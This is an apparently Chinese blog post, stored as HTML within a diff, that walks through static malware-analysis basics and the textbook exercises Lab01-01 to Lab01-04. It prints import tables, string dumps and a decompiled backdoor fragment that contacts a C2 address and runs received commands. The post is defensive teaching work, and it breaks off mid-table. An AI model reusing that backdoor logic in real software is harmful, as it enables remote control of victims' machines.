@@ -1,0 +1,603 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="
+知识点我觉得安全圈的思路都是差不多的，跟渗透测试一样，对一个恶意软件的分析也需要前期的信息收集阶段来帮助我们对目标有一个大致的了解和认识，方便确定下一步工作的方向。
+Virus Total：首先，拿到一个恶意软件如果不涉密的话可以直接上传到VT上看一下，这样差不多能确定此恶意软件的最早爆发日期和各种关键的信息。
+哈希值：hash值就相当于恶意软件的指纹，是一个很重要的信息。
+关键字符串：可以使用">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>静态分析基础技术 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="静态分析基础技术">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-01-17 17:00" pubdate>
+        2019年1月17日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      45
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">静态分析基础技术</h1>
+            
+            <div class="markdown-body">
+              <hr>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>我觉得安全圈的思路都是差不多的，跟渗透测试一样，对一个恶意软件的分析也需要前期的信息收集阶段来帮助我们对目标有一个大致的了解和认识，方便确定下一步工作的方向。</p>
+<p><strong>Virus Total：</strong>首先，拿到一个恶意软件如果不涉密的话可以直接上传到<code>VT</code>上看一下，这样差不多能确定此恶意软件的最早爆发日期和各种关键的信息。</p>
+<p><strong>哈希值：</strong><code>hash</code>值就相当于恶意软件的指纹，是一个很重要的信息。</p>
+<p><strong>关键字符串：</strong>可以使用<code>IDA Pro</code>或者<code>Strings</code>软件来查看程序中关键的字符串。</p>
+<span id="more"></span>
+
+<p><strong>加壳与代码混淆：</strong>一般来说，对软件加壳可以压缩软件代码占用的磁盘空间，使软件体积更小，另一方面，有的壳可以加密程序自身信息，是得程序难以通过逆向手段来对程序进行分析，是对程序本身的一种保护，大部分形况下加壳技术用来保护程序版权，但是恶意软件使用加壳方式来隐藏恶意代码，使得代码逻辑难以分析，这时候就需要我们使用已有的脱壳软件或者自己写脱壳脚本对软件进行脱壳还原。</p>
+<p>使用<code>PEview</code>查看<code>IMAGE_SECTION_HEADER</code>的<code>.text</code>节头部信息，如果虚拟大小比原始大小大得多，意味着这个程序在内存中占用的空间比在磁盘上多得多，那么这个程序很可能是加壳的程序，<code>.data</code>节是例外。</p>
+<p><strong>PE文件格式：</strong>PE文件格式就不多说了，网上有很多资料，要熟悉PE格式，方便后面的学习。</p>
+<p><strong>静态链接|动态链接|运行时链接|链接库与函数：</strong>程序的导入表和导出表和一些用到的库对我们而言十分重要，静态链接由于重复占用内存因而不常见，运行时链接在正常的程序中一般见不到，但是在恶意软件中可能会出现，至于当需要用到函数的时候才会使用链接，增强了隐蔽性。另外一些Windows API允许调用者导入没有在程序头文件中导入的函数，最常见的两个是<code>LoadLibrary</code>和<code>GetProcAddress</code>，有时还可能会出现<code>LdrGetProcAddress</code>和<code>LdrLoadDll</code>,当程序中出现这些函数库时，安全人员无法通过静态分析的手法来分析程序链接的函数。</p>
+<p><strong>Dependency Walker：</strong> 一款可以查看可执行文件动态链接函数的程序，<a target="_blank" rel="noopener" href="http://www.dependencywalker.com/">下载链接。</a></p>
+<p><strong>Resource Hacker：</strong>使用此工具来产看程序的资源节。</p>
+<p>导入函数和导出函数是为了提高代码复用性的一种手段，导出函数通常出现在<code>dll</code>文件中，而<code>exe</code>文件中一般没有导出函数，如果发现一个<code>exe</code>文件有很多导出函数的话我们就需要多多留意。</p>
+<p><strong>编译时间：</strong>使用<code>Delphi</code>语言编写的程序有着统一的编译时间：1992年6月19日，所以说，如果有一个程序的编译时间为1992年6月19日，那么这个程序很可能是用<code>Delphi</code>编写的</p>
+<h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab1-1"><a href="#Lab1-1" class="headerlink" title="Lab1-1"></a>Lab1-1</h3><p><strong>这个实验使用Lab01-01.exe和Lab01-01.dll文件，使用本章描述的工具和技术来获取关于这些文件的信息。</strong></p>
+<p><strong>1.将文件上传至VT进行分析并产看报告，文件匹配到了已有的反病毒文件特征了吗?</strong></p>
+<p>按照题目要求上传至VT查看结果即可。</p>
+<p><strong>2.这些文件是什么时候编译的？</strong></p>
+<p>其实VT上已经显示了此程序的<code>MetaData</code>即元信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Meta">CodeSize	4096<br>EntryPoint	0x1820<br>FileType	Win32 EXE<br>FileTypeExtension	exe<br>ImageFileCharacteristics	No relocs, Executable, No line numbers, No symbols, 32-bit<br>ImageVersion	0.0<br>InitializedDataSize	8192<br>LinkerVersion	6.0<br>MIMEType	application/octet-stream<br>MachineType	Intel 386 or later, and compatibles<br>OSVersion	4.0<br>PEType	PE32<br>Subsystem	Windows command line<br>SubsystemVersion	4.0<br>TimeStamp	2010:12:19 17:16:19+01:00<br>UninitializedDataSize	0<br></code></pre></td></tr></table></figure>
+
+<p>这里已经显示了程序的编译时间为2010:12:19，另外可以通过软件<code>PEexplore</code>来查看时间戳：</p>
+<p><img src="https://i.loli.net/2019/01/17/5c4035990c466.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>3.这两个文件中是否存在迹象说明他们是否被加壳或者混淆了？如果是，这些迹象在哪里。</strong></p>
+<p>VT上显示的结果为此程序加壳，壳是穿山甲(Armadillo)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Packers</span><br><span class="hljs-attribute">PEiD</span>	Armadillo v1.<span class="hljs-number">71</span><br></code></pre></td></tr></table></figure>
+
+<p>但实际山此程序并没有加壳，可能是由于VT是采用机器学习来判断程序是否加壳存在一定的误判率。</p>
+<p><code>.text</code>节表信息：</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Virtual Address</th>
+<th>Virtual Size</th>
+<th>Raw Size</th>
+<th>Entropy</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.text</td>
+<td>4096</td>
+<td>2416</td>
+<td>4096</td>
+<td>4.45</td>
+</tr>
+</tbody></table>
+<p>用<code>PEiD</code>查看查壳发现程序无壳。</p>
+<p><strong>4.是否有导入函数显示出这个恶意代码是做什么的？如果是，是哪些导入函数。</strong></p>
+<p>我个人习惯直接用IDA Pro查看导入函数:</p>
+<p>Lab01-01.exe:</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dns">Address	Ordinal	Name	Library<br><span class="hljs-number">00402000</span>		CloseHandle	KERNEL32<br><span class="hljs-number">00402004</span>		UnmapViewOfFile	KERNEL32<br><span class="hljs-number">00402008</span>		IsBadReadPtr	KERNEL32<br><span class="hljs-number">0040200</span>C		MapViewOfFile	KERNEL32<br><span class="hljs-number">00402010</span>		CreateFileMappingA	KERNEL32<br><span class="hljs-number">00402014</span>		CreateFileA	KERNEL32<br><span class="hljs-number">00402018</span>		FindClose	KERNEL32<br><span class="hljs-number">0040201</span>C		FindNextFileA	KERNEL32<br><span class="hljs-number">00402020</span>		FindFirstFileA	KERNEL32<br><span class="hljs-number">00402024</span>		CopyFileA	KERNEL32<br><span class="hljs-number">0040202</span>C		malloc	MSVCRT<br><span class="hljs-number">00402030</span>		exit	MSVCRT<br><span class="hljs-number">00402034</span>		_exit	MSVCRT<br><span class="hljs-number">00402038</span>		_XcptFilter	MSVCRT<br><span class="hljs-number">0040203</span>C		__p___initenv	MSVCRT<br><span class="hljs-number">00402040</span>		__getmainargs	MSVCRT<br><span class="hljs-number">00402044</span>		_initterm	MSVCRT<br><span class="hljs-number">00402048</span>		__setusermatherr	MSVCRT<br><span class="hljs-number">0040204</span>C		_adjust_fdiv	MSVCRT<br><span class="hljs-number">00402050</span>		__p__commode	MSVCRT<br><span class="hljs-number">00402054</span>		__p__fmode	MSVCRT<br><span class="hljs-number">00402058</span>		__set_app_type	MSVCRT<br><span class="hljs-number">0040205</span>C		_except_handler3	MSVCRT<br><span class="hljs-number">00402060</span>		_controlfp	MSVCRT<br><span class="hljs-number">00402064</span>		_stricmp	MSVCRT<br></code></pre></td></tr></table></figure>
+
+<p>Lab01-01.dll:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">Address	Ordinal	Name	Library<br>10002000		Sleep	KERNEL32<br>10002004		CreateProcessA	KERNEL32<br>10002008		CreateMutexA	KERNEL32<br>1000200C		OpenMutexA	KERNEL32<br>10002010		CloseHandle	KERNEL32<br>10002018		_adjust_fdiv	MSVCRT<br>1000201C		malloc	MSVCRT<br>10002020		_initterm	MSVCRT<br>10002024		free	MSVCRT<br>10002028		strncmp	MSVCRT<br>10002030	23	socket	WS2_32<br>10002034	115	WSAStartup	WS2_32<br>10002038	11	inet_addr	WS2_32<br>1000203C	4	connect	WS2_32<br>10002040	19	send	WS2_32<br>10002044	22	shutdown	WS2_32<br>10002048	16	recv	WS2_32<br>1000204C	3	closesocket	WS2_32<br>10002050	116	WSACleanup	WS2_32<br>10002054	9	htons	WS2_32<br></code></pre></td></tr></table></figure>
+
+<p>可以看出此应用程序导入表中含有对文件操作的函数，<code>dll</code>文件中有网络连接相关的函数。</p>
+<p><strong>5.是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？</strong></p>
+<p>通过查看程序中的字符串，很容易可以发现如下字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:0040304C NewFileName     db &#x27;C:\windows\system32\kerne132.dll&#x27;,0<br>.data:0040304C                                         ; DATA XREF: _main+3AA↑o<br>.data:0040306D                 align 10h<br>.data:00403070 dword_403070    dd 6E72654Bh            ; DATA XREF: _main+2DF↑r<br>.data:00403074 dword_403074    dd 32336C65h            ; DATA XREF: _main+2E7↑r<br>.data:00403078 byte_403078     db 2Eh                  ; DATA XREF: _main+2F2↑r<br>.data:00403079                 align 4<br>.data:0040307C ; CHAR ExistingFileName[]<br>.data:0040307C ExistingFileName db &#x27;Lab01-01.dll&#x27;,0    ; DATA XREF: _main+A7↑o<br>.data:0040307C                                         ; _main+3AF↑o<br>.data:00403089                 align 4<br>.data:0040308C ; CHAR FileName[]<br>.data:0040308C FileName        db &#x27;C:\Windows\System32\Kernel32.dll&#x27;,0<br></code></pre></td></tr></table></figure>
+
+<p>因此我们可以查看<code>C:\windows\system32\kerne132.dll</code>文件是否存在，这里的<code>kernel</code>的最后的<code>l</code>用数字<code>1</code>代替了。</p>
+<p><strong>6.是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？</strong></p>
+<p>通过<code>IDA</code>查看<code>dll</code>文件的伪C代码，可以才看到在<code>DllMain()</code>函数中存在如下部分代码用于网络连接：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">-1</span> )<br>        &#123;<br>          name.sa_family = <span class="hljs-number">2</span>;<br>          *(_DWORD *)&amp;name.sa_data[<span class="hljs-number">2</span>] = inet_addr(cp);<br>          *(_WORD *)name.sa_data = htons(<span class="hljs-number">0x50</span>u);<br>          <span class="hljs-keyword">if</span> ( connect(v3, &amp;name, <span class="hljs-number">16</span>) != <span class="hljs-number">-1</span> )<br>          &#123;<br>            <span class="hljs-keyword">while</span> ( send(v3, ::buf, <span class="hljs-built_in">strlen</span>(::buf), <span class="hljs-number">0</span>) != <span class="hljs-number">-1</span> &amp;&amp; shutdown(v3, <span class="hljs-number">1</span>) != <span class="hljs-number">-1</span> )<br>            &#123;<br>              <span class="hljs-keyword">if</span> ( recv(v3, &amp;buf, <span class="hljs-number">4096</span>, <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span> )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(Str1, &amp;buf, <span class="hljs-number">5u</span>) )<br>                &#123;<br>                  Sleep(<span class="hljs-number">0x60000</span>u);<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(aExec, &amp;buf, <span class="hljs-number">4u</span>) )<br>                &#123;<br>                  <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>                  StartupInfo.cb = <span class="hljs-number">68</span>;<br>                  CreateProcessA(<span class="hljs-number">0</span>, &amp;CommandLine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x8000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<br>                &#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过双击<code>cp</code>可以看到如下结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:10026010 ; char aExec[]<br>.data:10026010 aExec           db &#x27;exec&#x27;,0             ; DATA XREF: DllMain(x,x,x)+15B↑o<br>.data:10026015                 align 4<br>.data:10026018 ; char Str1[]<br>.data:10026018 Str1            db &#x27;sleep&#x27;,0            ; DATA XREF: DllMain(x,x,x)+136↑o<br>.data:1002601E                 align 10h<br>.data:10026020 ; char buf[]<br>.data:10026020 buf             db &#x27;hello&#x27;,0            ; DATA XREF: DllMain(x,x,x):loc_100010E9↑o<br>.data:10026020                                         ; DllMain(x,x,x)+EB↑o<br>.data:10026026                 align 4<br>.data:10026028 ; char cp[]<br>.data:10026028 cp              db &#x27;127.26.152.13&#x27;,0    ; DATA XREF: DllMain(x,x,x)+93↑o<br>.data:10026036                 align 4<br>.data:10026038 ; CHAR Name[]<br>.data:10026038 Name            db &#x27;SADFHUHF&#x27;,0         ; DATA XREF: DllMain(x,x,x)+38↑o<br>.data:10026038  <br></code></pre></td></tr></table></figure>
+
+<p>因此我们了解到程序会向地址<code>127.26.152.13</code>建立网络连接，这一点可以作为网络特征。</p>
+<p><strong>7.你猜这些文件的目的是什么？</strong></p>
+<p>该<code>dll</code>文件类似木马程序，可以执行命令或者进入休眠，<code>127.26.152.13</code>相当于<code>C2</code>服务器，<code>exe</code>文件是用来释放安装此<code>dll</code>文件的。</p>
+<h3 id="Lab1-2"><a href="#Lab1-2" class="headerlink" title="Lab1-2"></a>Lab1-2</h3><p><strong>分析Lab01-02.exe文件。</strong></p>
+<p><strong>1.将此文件上传到VT并查看是否有匹配到的反病毒特征。</strong></p>
+<p>按照题目要求上传至<code>VT</code>查看结果即可。</p>
+<p><strong>2.这个文件是否有加壳或混淆的情况？请指明。如果该文件被加壳，请进行脱壳。</strong></p>
+<p>把这个程序丢进<code>IDA</code>看一下发现弹出了一个警告框，提示该程序可能加了壳：</p>
+<p><img src="https://i.loli.net/2019/01/18/5c41e123a6e41.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://i.loli.net/2019/01/18/5c41e2d17223d.png" srcset="/img/loading.gif" lazyload></p>
+<p>用<code>PEiD</code>查壳得知这个壳是<code>UPX</code></p>
+<p><img src="https://i.loli.net/2019/01/18/5c41e31d9b699.png" srcset="/img/loading.gif" lazyload></p>
+<p>下载<code>UPX</code>脱壳工具使用命令<code>upx -d Lab01-02.exe</code>对程序脱脱壳，脱壳后发现程序由原来的<code>3kb</code>变为了<code>16kb</code></p>
+<p><strong>3.有没有任何导入函数能暗示出这个程序的功能，如果有，这些导入函数是什么，给了你什么信息？</strong></p>
+<p>将脱壳后的程序放入IDA中查看导入函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">Address	Ordinal	Name	Library<br>00402000		CreateServiceA	ADVAPI32<br>00402004		StartServiceCtrlDispatcherA	ADVAPI32<br>00402008		OpenSCManagerA	ADVAPI32<br>00402010		SystemTimeToFileTime	KERNEL32<br>00402014		GetModuleFileNameA	KERNEL32<br>00402018		CreateWaitableTimerA	KERNEL32<br>0040201C		ExitProcess	KERNEL32<br>00402020		OpenMutexA	KERNEL32<br>00402024		SetWaitableTimer	KERNEL32<br>00402028		WaitForSingleObject	KERNEL32<br>0040202C		CreateMutexA	KERNEL32<br>00402030		CreateThread	KERNEL32<br>00402038		_exit	MSVCRT<br>0040203C		_XcptFilter	MSVCRT<br>00402040		exit	MSVCRT<br>00402044		__p___initenv	MSVCRT<br>00402048		__getmainargs	MSVCRT<br>0040204C		_initterm	MSVCRT<br>00402050		__setusermatherr	MSVCRT<br>00402054		_adjust_fdiv	MSVCRT<br>00402058		__p__commode	MSVCRT<br>0040205C		__p__fmode	MSVCRT<br>00402060		__set_app_type	MSVCRT<br>00402064		_except_handler3	MSVCRT<br>00402068		_controlfp	MSVCRT<br>00402070		InternetOpenUrlA	WININET<br>00402074		InternetOpenA	WININET<br></code></pre></td></tr></table></figure>
+
+<p>其中有一些创建服务的函数<code>CreateService</code>和打开一个URL的网络操作函数<code>InternetOpenUrl</code>需要我们注意。</p>
+<p><strong>4.有哪些基于主机或者网络的特征可以被用来确定被这个恶意代码所感染的机器？</strong></p>
+<p>通过<code>IDA</code>分析发现程序指定的<code>URL</code>为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.malwareanalysisbook.com<br></code></pre></td></tr></table></figure>
+
+<p>程序会在计算机上创建一个名为<code>MalService</code>的服务，且程序会创建一个互斥量<code>HGL345</code></p>
+<p>可通过如上特征确定被此恶意代码感染的机器。</p>
+<h3 id="Lab1-3"><a href="#Lab1-3" class="headerlink" title="Lab1-3"></a>Lab1-3</h3><p><strong>分析Lab01-03.exe文件。</strong></p>
+<p><strong>1.将此文件上传到VT并查看是否有匹配到的反病毒特征。</strong></p>
+<p>按照题目要求上传至<code>VT</code>查看结果即可。</p>
+<p><strong>2.这个文件是否有加壳或混淆的情况？请指明。如果该文件被加壳，请进行脱壳。</strong></p>
+<p>用IDA打开此文件时同样弹窗警告该文件可能已被加壳，用<code>PEiD</code>无法识别程序的壳。</p>
+<p><strong>3.有没有任何导入函数能暗示出这个程序的功能，如果有，这些导入函数是什么，给了你什么信息？</strong></p>
+<p>暂时上不了网，这个先放一放。</p>
+<p><strong>4.有哪些基于主机或者网络的特征可以被用来确定被这个恶意代码所感染的机器？</strong></p>
+<p>暂未脱壳</p>
+<h3 id="Lab1-4"><a href="#Lab1-4" class="headerlink" title="Lab1-4"></a>Lab1-4</h3><p><strong>分析Lab01-04.exe文件。</strong></p>
+<p><strong>1.将此文件上传到VT并查看是否有匹配到的反病毒特征。</strong></p>
+<p>按照题目要求上传至<code>VT</code>查看结果即可。</p>
+<p><strong>2.这个文件是否有加壳或混淆的情况？请指明。如果该文件被加壳，请进行脱壳。</strong></p>
+<p>此程序没有加壳迹象。</p>
+<p><strong>3.这个文件是什么时候被编译的？</strong></p>
+<p><code>PE Explore</code>显示此程序的编译时间是2019年8月30日，显然这个时间戳是被人为修改过的。</p>
+<p><strong>4.有没有任何导入函数能暗示出这个程序的功能，如果有，这些导入函数是什么，给了你什么信息？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs asm">Address	Ordinal	Name	Library<br>00402000		OpenProcessToken	ADVAPI32<br>00402004		LookupPrivilegeValueA	ADVAPI32<br>00402008		AdjustTokenPrivileges	ADVAPI32<br>00402010		GetProcAddress	KERNEL32<br>00402014		LoadLibraryA	KERNEL32<br>00402018		WinExec	KERNEL32<br>0040201C		WriteFile	KERNEL32<br>00402020		CreateFileA	KERNEL32<br>00402024		SizeofResource	KERNEL32<br>00402028		CreateRemoteThread	KERNEL32<br>0040202C		FindResourceA	KERNEL32<br>00402030		GetModuleHandleA	KERNEL32<br>00402034		